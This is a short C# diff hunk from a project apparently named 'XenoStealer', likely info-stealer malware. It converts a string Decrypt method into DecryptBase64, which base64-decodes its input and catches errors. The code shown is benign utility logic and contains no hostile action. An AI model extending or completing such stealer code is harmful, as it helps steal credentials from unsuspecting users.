@@ -60,9 +60,16 @@ namespace XenoStealer
             return null;
         }
 
-        public string Decrypt(string buffer) 
+        public string DecryptBase64(string buffer) 
         {
-            return Decrypt(Encoding.Default.GetBytes(buffer));
+            try
+            {
+                return Decrypt(Convert.FromBase64String(buffer));
+            }
+            catch 
+            {
+                return null;
+            }
         }
 
         public string Decrypt(byte[] buffer)
